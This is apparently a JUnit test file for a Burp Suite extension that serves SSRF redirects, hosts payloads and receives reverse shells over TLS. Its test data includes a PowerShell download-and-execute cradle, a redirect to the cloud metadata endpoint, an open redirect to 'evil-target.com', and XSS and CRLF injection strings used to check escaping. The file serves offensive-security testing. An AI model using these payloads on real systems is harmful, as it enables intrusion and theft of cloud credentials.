package burp;

import burp.listener.MockRoute;
import burp.listener.SessionManager;
import burp.listener.ShellSession;
import burp.listener.TlsSocketHelper;
import burp.listener.WebhookResponseConfig;
import org.junit.Test;

import javax.net.ssl.SSLContext;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Proxy;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;

import static org.junit.Assert.*;

public class FeatureExpansionTest {

    @Test
    public void testMockRoutesAndRedirects() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // 1. Test /redirect route (SSRF Redirector)
        byte[] redirectResp = config.buildResponseBytes("10.10.10.2", "GET", "/redirect", 8080, "Host: 10.10.10.2", 0);
        String redirectStr = new String(redirectResp, StandardCharsets.UTF_8);
        assertTrue(redirectStr.contains("HTTP/1.1 302 Found"));
        assertTrue(redirectStr.contains("Location: http://169.254.169.254/latest/meta-data/"));

        // 2. Test /aws-meta route
        byte[] awsResp = config.buildResponseBytes("10.10.10.2", "GET", "/aws-meta", 8080, "Host: 10.10.10.2", 0);
        String awsStr = new String(awsResp, StandardCharsets.UTF_8);
        assertTrue(awsStr.contains("HTTP/1.1 200 OK"));
        assertTrue(awsStr.contains("instanceId"));

        // 3. Test Auto-Host Payload
        config.autoHostPayload("powershell -c \"iex(new-object net.webclient).downloadstring('...')\"", "rev.ps1");
        byte[] payloadResp = config.buildResponseBytes("10.10.10.2", "GET", "/rev.ps1", 8080, "Host: 10.10.10.2", 0);
        String payloadStr = new String(payloadResp, StandardCharsets.UTF_8);
        assertTrue(payloadStr.contains("powershell -c"));
    }

    @Test
    public void testQueryParameterOverrides() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // Test dynamic ?status=302&location=https://evil-target.com
        byte[] dynRedirect = config.buildResponseBytes("10.10.10.5", "GET", "/?status=302&location=https://evil-target.com", 8080, "Host: test", 0);
        String dynRedirectStr = new String(dynRedirect, StandardCharsets.UTF_8);
        assertTrue(dynRedirectStr.contains("HTTP/1.1 302"));
        assertTrue(dynRedirectStr.contains("Location: https://evil-target.com"));

        // Test dynamic ?status=401&body=UnauthorizedAccess
        byte[] dynAuth = config.buildResponseBytes("10.10.10.5", "GET", "/?status=401&body=UnauthorizedAccess", 8080, "Host: test", 0);
        String dynAuthStr = new String(dynAuth, StandardCharsets.UTF_8);
        assertTrue(dynAuthStr.contains("HTTP/1.1 401"));
        assertTrue(dynAuthStr.contains("UnauthorizedAccess"));
    }

    @Test
    public void testCrlfInjectionPreventionInLocationHeader() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // Attempt CRLF header injection via location parameter: ?status=302&location=https://evil.com%0d%0aInjected-Header:%20pwned
        byte[] resp = config.buildResponseBytes("10.10.10.5", "GET", "/?status=302&location=https://evil.com\r\nInjected-Header: pwned", 8080, "Host: test", 0);
        String respStr = new String(resp, StandardCharsets.UTF_8);

        // Verify no CRLF in the Location header line and no injected header
        assertFalse(respStr.contains("\r\nInjected-Header: pwned\r\n"));
        assertTrue(respStr.contains("Location: https://evil.comInjected-Header: pwned\r\n"));
    }

    @Test
    public void testXssHtmlEncodingInWebhookResponse() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // Attempt XSS via client IP, path, method, and headers
        String xssPath = "/test?param=<script>alert('XSS')</script>";
        String xssIp = "<img src=x onerror=alert(1)>";
        String xssMethod = "<svg onload=alert(1)>";
        String xssHeaders = "Header: <script>alert(document.cookie)</script>";

        byte[] resp = config.buildResponseBytes(xssIp, xssMethod, xssPath, 8080, xssHeaders, 100);
        String respStr = new String(resp, StandardCharsets.UTF_8);

        // Verify all XSS payloads are HTML-encoded and raw executable tags do NOT exist in the body
        assertFalse(respStr.contains("<script>alert('XSS')</script>"));
        assertFalse(respStr.contains("<img src=x onerror=alert(1)>"));
        assertFalse(respStr.contains("<svg onload=alert(1)>"));
        assertFalse(respStr.contains("<script>alert(document.cookie)</script>"));

        assertTrue(respStr.contains("&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;"));
        assertTrue(respStr.contains("&lt;img src=x onerror=alert(1)&gt;"));
        assertTrue(respStr.contains("&lt;svg onload=alert(1)&gt;"));
        assertTrue(respStr.contains("&lt;script&gt;alert(document.cookie)&lt;/script&gt;"));
    }

    @Test
    public void testTlsCertificateGenerationAndUniqueKeys() throws Exception {
        // Generate two self-signed certificates and verify they have unique key pairs and serials
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
        kpg.initialize(2048, new SecureRandom());

        KeyPair kp1 = kpg.generateKeyPair();
        KeyPair kp2 = kpg.generateKeyPair();

        X509Certificate cert1 = TlsSocketHelper.generateSelfSignedCertificate(kp1, "Reverse Shell Receiver");
        X509Certificate cert2 = TlsSocketHelper.generateSelfSignedCertificate(kp2, "Reverse Shell Receiver");

        assertNotNull(cert1);
        assertNotNull(cert2);
        assertNotEquals(cert1.getSerialNumber(), cert2.getSerialNumber());
        assertNotEquals(cert1.getPublicKey(), cert2.getPublicKey());

        // Verify certificate validity
        cert1.checkValidity();
        cert2.checkValidity();
        assertEquals("CN=Reverse Shell Receiver", cert1.getSubjectDN().getName());
        assertEquals("SHA256withRSA", cert1.getSigAlgName());
    }

    @Test
    public void testTlsSettingsPersistenceWithCallbacks() throws Exception {
        Map<String, String> settingsStore = new HashMap<>();
        IBurpExtenderCallbacks callbacks = createMockCallbacks(settingsStore, null);

        // First call should generate and save certificate
        SSLContext sslContext1 = TlsSocketHelper.createSslContext(callbacks);
        assertNotNull(sslContext1);
        assertTrue(settingsStore.containsKey("tls_keystore_b64"));
        assertTrue(settingsStore.containsKey("tls_keystore_password"));

        String savedB64 = settingsStore.get("tls_keystore_b64");
        String savedPwd = settingsStore.get("tls_keystore_password");
        assertNotNull(savedB64);
        assertNotNull(savedPwd);

        // Second call should reload the existing certificate from settingsStore
        SSLContext sslContext2 = TlsSocketHelper.createSslContext(callbacks);
        assertNotNull(sslContext2);
        assertEquals(savedB64, settingsStore.get("tls_keystore_b64"));
        assertEquals(savedPwd, settingsStore.get("tls_keystore_password"));
    }

    @Test
    public void testTlsSocketHelper() throws Exception {
        SSLContext sslContext = TlsSocketHelper.createSslContext();
        assertNotNull(sslContext);
        assertEquals("TLS", sslContext.getProtocol());

        // Test creating an actual SSLServerSocket and accepting a test client
        javax.net.ssl.SSLServerSocket serverSocket = TlsSocketHelper.createTlsServerSocket(0, 5, java.net.InetAddress.getByName("127.0.0.1"));
        assertNotNull(serverSocket);
        int localPort = serverSocket.getLocalPort();

        Thread serverThread = new Thread(() -> {
            try (javax.net.ssl.SSLSocket client = (javax.net.ssl.SSLSocket) serverSocket.accept()) {
                client.getOutputStream().write("HTTP/1.1 200 OK\r\n\r\nTLS OK".getBytes(StandardCharsets.UTF_8));
                client.getOutputStream().flush();
            } catch (Exception ignored) {}
        });
        serverThread.start();

        javax.net.ssl.SSLSocket clientSocket = (javax.net.ssl.SSLSocket) sslContext.getSocketFactory().createSocket("127.0.0.1", localPort);
        clientSocket.startHandshake();

        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(clientSocket.getInputStream()));
        String line = reader.readLine();
        assertEquals("HTTP/1.1 200 OK", line);

        clientSocket.close();
        serverSocket.close();
    }

    @Test
    public void testSessionManagerMemoryLeakFix() throws Exception {
        SessionManager manager = new SessionManager(Executors.newCachedThreadPool());
        assertEquals(0, manager.getAllSessions().size());
        assertEquals(0, manager.getActiveSessionCount());

        // Register dummy sockets as sessions
        MockSocket dummySocket1 = new MockSocket();
        MockSocket dummySocket2 = new MockSocket();

        ShellSession s1 = manager.registerNewSession(dummySocket1);
        ShellSession s2 = manager.registerNewSession(dummySocket2);

        assertEquals(2, manager.getAllSessions().size());

        // Close session 1 -> must remove s1 from the sessions list completely
        manager.closeSession(s1.getId());
        assertEquals(1, manager.getAllSessions().size());
        assertFalse(manager.getAllSessions().contains(s1));
        assertTrue(manager.getAllSessions().contains(s2));

        // Close session 2 -> list must become empty
        manager.closeSession(s2.getId());
        assertEquals(0, manager.getAllSessions().size());
    }

    @Test
    public void testShellSessionUnexpectedErrorLogged() throws Exception {
        StringBuilder errorLog = new StringBuilder();
        IBurpExtenderCallbacks callbacks = createMockCallbacks(new HashMap<>(), errorLog);

        // Socket that throws IOException on read while session is still active
        MockErrorSocket errorSocket = new MockErrorSocket();
        ShellSession session = new ShellSession(1, errorSocket, callbacks, null);
        session.startReading(Executors.newSingleThreadExecutor());

        // Wait for reader thread to encounter IOException
        Thread.sleep(200);

        assertTrue("Expected error to be logged when connection breaks unexpectedly", errorLog.toString().contains("broken unexpectedly"));
        assertFalse("Session should be marked inactive", session.isActive());
    }

    @Test
    public void testTerminalSanitizationOscAndCsi() {
        // 1. Kali Linux OSC window title sequence: \033]0;root@DESKTOP-6ALMHTS: ~\007
        String rawKaliOsc = "\u001B]0;root@DESKTOP-6ALMHTS: ~\u0007┌──(root㉿DESKTOP-6ALMHTS)-[~]\n└─# ";
        String cleanedKali = ShellSession.sanitizeTerminalOutput(rawKaliOsc);
        assertFalse("OSC window title must be completely stripped", cleanedKali.contains("]0;root@DESKTOP-6ALMHTS"));
        assertTrue("Prompt line 1 must be preserved", cleanedKali.contains("┌──(root㉿DESKTOP-6ALMHTS)-[~]"));
        assertTrue("Prompt line 2 must be preserved", cleanedKali.contains("└─# "));

        // 2. OSC terminated with String Terminator (ST): \033\
        String rawOscSt = "\u001B]2;My Terminal Title\u001B\\Prompt> ";
        String cleanedOscSt = ShellSession.sanitizeTerminalOutput(rawOscSt);
        assertFalse("OSC with ST terminator must be completely stripped", cleanedOscSt.contains("My Terminal Title"));
        assertEquals("Prompt> ", cleanedOscSt);

        // 3. CSI Color codes (SGR) and cursor movements
        String rawCsi = "\u001B[1;32muser@host\u001B[0m:\u001B[1;34m/var/www\u001B[0m$ \u001B[2K";
        String cleanedCsi = ShellSession.sanitizeTerminalOutput(rawCsi);
        assertEquals("user@host:/var/www$ ", cleanedCsi);

        // 4. Bracketed paste mode codes (\033[?2004h / \033[?2004l)
        String rawBracketed = "\u001B[?2004hcommand\u001B[?2004l";
        String cleanedBracketed = ShellSession.sanitizeTerminalOutput(rawBracketed);
        assertEquals("command", cleanedBracketed);
    }

    @Test
    public void testTerminalWhitespaceAndCrlfNormalization() {
        // 1. CRLF and excess CR
        String rawCrlf = "line1\r\nline2\r\r\nline3\n";
        String cleanedCrlf = ShellSession.sanitizeTerminalOutput(rawCrlf);
        assertEquals("line1\nline2\nline3\n", cleanedCrlf);

        // 2. Isolated CR (cursor return to start of line) must NOT become extra newline
        String rawCr = "\r└─# ";
        String cleanedCr = ShellSession.sanitizeTerminalOutput(rawCr);
        assertEquals("└─# ", cleanedCr);

        // 3. Excessive vertical blank lines (>2 newlines) collapsed to \n\n
        String rawNewlines = "block1\n\n\n\n\nblock2";
        String cleanedNewlines = ShellSession.sanitizeTerminalOutput(rawNewlines);
        assertEquals("block1\n\nblock2", cleanedNewlines);

        // 4. Meaningful indentation (spaces/tabs) preserved
        String rawIndented = "  total 24\n\tdrwxr-xr-x 2 root root\n";
        String cleanedIndented = ShellSession.sanitizeTerminalOutput(rawIndented);
        assertEquals("  total 24\n\tdrwxr-xr-x 2 root root\n", cleanedIndented);
    }

    @Test
    public void testCommandEchoAndStrayPromptSuppression() throws Exception {
        MockSocket socket = new MockSocket();
        ShellSession session = new ShellSession(99, socket, null);

        // Simulate user sending command "id"
        session.sendCommand("id", Executors.newSingleThreadExecutor());

        // Incoming raw chunk contains: echoed command "id", stray readline prompt "└─#", and actual output "uid=0..."
        String rawChunk = "id\r\n└─# \r\nuid=0(root) gid=0(root) groups=0(root)\n";
        String processed = session.processIncomingChunk(rawChunk);

        assertFalse("Command echo 'id' must be suppressed", processed.contains("id\n"));
        assertFalse("Stray prompt '└─#' before output must be suppressed", processed.contains("└─#"));
        assertTrue("Command output must be preserved", processed.contains("uid=0(root) gid=0(root) groups=0(root)"));

        // Next chunk contains the post-execution prompt with Kali OSC window title -> must be completely suppressed
        String postPrompt = "\u001B]0;root@DESKTOP-6ALMHTS: ~\u0007┌──(root㉿DESKTOP-6ALMHTS)-[~]\n└─# ";
        String processedPrompt = session.processIncomingChunk(postPrompt);
        assertEquals("Post-execution remote prompt must be completely suppressed", "", processedPrompt);

        // Redundant duplicate prompt packet arrived right after
        String duplicatePacket = "\r\n└─# \r\n";
        String processedDuplicate = session.processIncomingChunk(duplicatePacket);
        assertEquals("Subsequent redundant prompt packet must be completely suppressed", "", processedDuplicate);
    }

    @Test
    public void testFragmentedTcpEchoAndStrayPromptSuppression() throws Exception {
        MockSocket socket = new MockSocket();
        ShellSession session = new ShellSession(101, socket, null);

        // Simulate user sending command "id"
        session.sendCommand("id", Executors.newSingleThreadExecutor());

        // Fragmented Packet 1: Command echo only
        String pkt1 = "id\r\n";
        String res1 = session.processIncomingChunk(pkt1);
        assertEquals("Command echo alone must be suppressed", "", res1);

        // Fragmented Packet 2: Stray readline pre-execution redraw prompt ("└─# ")
        String pkt2 = "└─# \r\n";
        String res2 = session.processIncomingChunk(pkt2);
        assertEquals("Stray pre-execution prompt across packet boundary must be suppressed", "", res2);

        // Fragmented Packet 3: Actual command output
        String pkt3 = "uid=0(root) gid=0(root) groups=0(root)\r\n";
        String res3 = session.processIncomingChunk(pkt3);
        assertTrue("Command output must be preserved", res3.contains("uid=0(root) gid=0(root) groups=0(root)"));
        assertFalse("Output chunk must not contain stray prompt", res3.contains("└─#"));

        // Fragmented Packet 4: Post-execution prompt -> must be completely suppressed
        String pkt4 = "┌──(root㉿DESKTOP-6ALMHTS)-[~]\n└─# ";
        String res4 = session.processIncomingChunk(pkt4);
        assertEquals("Post-execution prompt must be completely suppressed", "", res4);
    }

    @Test
    public void testCrossChunkPromptDeduplication() throws Exception {
        MockSocket socket = new MockSocket();
        ShellSession session = new ShellSession(100, socket, null);

        // Packet 1: Initial Kali prompt arrives before any command has been typed
        String pkt1 = "]0;root@DESKTOP-6ALMHTS: ~┌──(root㉿DESKTOP-6ALMHTS)-[~]\n└─# ";
        String res1 = session.processIncomingChunk(pkt1);
        assertEquals("Initial shell prompt before user executes a command must be suppressed", "", res1);

        // User dispatches a command
        session.getCommandHistory().add("id");

        // Packet 2: Post-execution prompt with Kali OSC window title -> must be completely suppressed
        String pkt2 = "]0;root@DESKTOP-6ALMHTS: ~┌──(root㉿DESKTOP-6ALMHTS)-[~]\n└─# ";
        String res2 = session.processIncomingChunk(pkt2);
        assertEquals("Post-execution prompt must be completely suppressed", "", res2);

        // Packet 3: Readline re-emits redundant "└─# "
        String pkt3 = "\n└─# \n";
        String res3 = session.processIncomingChunk(pkt3);
        assertEquals("Redundant single-line prompt must be suppressed", "", res3);

        // Packet 4: Readline re-emits entire redundant prompt block
        String pkt4 = "]0;root@DESKTOP-6ALMHTS: ~┌──(root㉿DESKTOP-6ALMHTS)-[~]\n└─# ";
        String res4 = session.processIncomingChunk(pkt4);
        assertEquals("Redundant prompt block must be suppressed", "", res4);
    }

    @Test
    public void testCombinedOutputAndTrailingPromptStripping() throws Exception {
        MockSocket socket = new MockSocket();
        ShellSession session = new ShellSession(102, socket, null);

        // Simulate user sending command "whoami"
        session.sendCommand("whoami", Executors.newSingleThreadExecutor());

        // Single chunk containing echo, output, and trailing Kali prompt
        String combinedChunk = "whoami\r\nroot\r\n\r\n┌──(root㉿DESKTOP-6ALMHTS)-[~]\n└─# ";
        String processed = session.processIncomingChunk(combinedChunk);

        assertEquals("Only clean command output must remain, trailing prompt must be stripped", "root\n", processed);
    }

    // --- Mock Helpers ---

    private static IBurpExtenderCallbacks createMockCallbacks(Map<String, String> settingsStore, StringBuilder errorLog) {
        return (IBurpExtenderCallbacks) Proxy.newProxyInstance(
                IBurpExtenderCallbacks.class.getClassLoader(),
                new Class<?>[] { IBurpExtenderCallbacks.class },
                (proxy, method, args) -> {
                    String name = method.getName();
                    if ("loadExtensionSetting".equals(name)) {
                        return settingsStore.get((String) args[0]);
                    } else if ("saveExtensionSetting".equals(name)) {
                        settingsStore.put((String) args[0], (String) args[1]);
                        return null;
                    } else if ("printError".equals(name)) {
                        if (errorLog != null && args != null && args.length > 0) {
                            errorLog.append(args[0]).append("\n");
                        }
                        return null;
                    } else if ("printOutput".equals(name)) {
                        return null;
                    }
                    Class<?> returnType = method.getReturnType();
                    if (returnType == boolean.class) return false;
                    if (returnType == int.class) return 0;
                    return null;
                }
        );
    }

    private static class MockSocket extends Socket {
        private final ByteArrayInputStream in = new ByteArrayInputStream(new byte[0]);
        private final ByteArrayOutputStream out = new ByteArrayOutputStream();
        private boolean closed = false;

        @Override public InputStream getInputStream() { return in; }
        @Override public OutputStream getOutputStream() { return out; }
        @Override public InetAddress getInetAddress() {
            try { return InetAddress.getByName("127.0.0.1"); } catch (Exception e) { return null; }
        }
        @Override public int getPort() { return 54321; }
        @Override public synchronized void close() { closed = true; }
        @Override public boolean isClosed() { return closed; }
    }

    private static class MockErrorSocket extends Socket {
        private boolean closed = false;

        @Override
        public InputStream getInputStream() {
            return new InputStream() {
                @Override
                public int read() throws IOException {
                    throw new IOException("Connection reset by peer (simulated unexpected failure)");
                }
            };
        }

        @Override public OutputStream getOutputStream() { return new ByteArrayOutputStream(); }
        @Override public InetAddress getInetAddress() {
            try { return InetAddress.getByName("127.0.0.1"); } catch (Exception e) { return null; }
        }
        @Override public int getPort() { return 54321; }
        @Override public synchronized void close() { closed = true; }
        @Override public boolean isClosed() { return closed; }
    }
}
